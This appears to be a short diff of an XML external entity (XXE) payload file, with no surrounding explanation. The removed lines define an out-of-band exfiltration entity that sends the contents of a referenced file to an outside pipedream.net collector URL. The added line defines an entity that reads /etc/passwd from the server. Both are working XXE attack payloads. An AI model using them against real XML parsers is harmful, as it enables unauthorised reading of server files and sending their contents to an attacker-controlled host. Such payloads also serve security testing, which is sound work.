@@ -1,2 +1,1 @@
-<!ENTITY % all "<!ENTITY send SYSTEM 'https://end7l0yp0boy.x.pipedream.net/?collect=%file;'>">
-%all;
+<!ENTITY xxe SYSTEM "file:///etc/passwd">
